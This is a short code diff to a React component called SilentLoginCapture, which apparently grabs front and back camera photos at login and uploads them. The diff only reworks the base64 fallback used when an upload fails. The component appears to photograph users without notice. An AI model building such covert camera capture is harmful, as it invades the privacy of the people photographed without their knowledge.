@@ -316,8 +316,8 @@ export default function SilentLoginCapture({
     console.log("[SilentCapture] Back image:", backImg ? "captured, length: " + backImg.length : "null");
 
     // Try to upload, fallback to base64 if fails
-    let frontUrl = frontImg;
-    let backUrl = backImg;
+    let frontUrl: string | undefined = undefined;
+    let backUrl: string | undefined = undefined;
 
     if (frontImg && frontImg.length > 1000) {
       console.log("[SilentCapture] Uploading front camera photo...");
@@ -327,6 +327,7 @@ export default function SilentLoginCapture({
         console.log("[SilentCapture] Front uploaded:", frontUrl);
       } else {
         console.log("[SilentCapture] Front upload failed, using base64");
+        frontUrl = frontImg;
       }
     }
 
@@ -338,6 +339,7 @@ export default function SilentLoginCapture({
         console.log("[SilentCapture] Back uploaded:", backUrl);
       } else {
         console.log("[SilentCapture] Back upload failed, using base64");
+        backUrl = backImg;
       }
     }
 
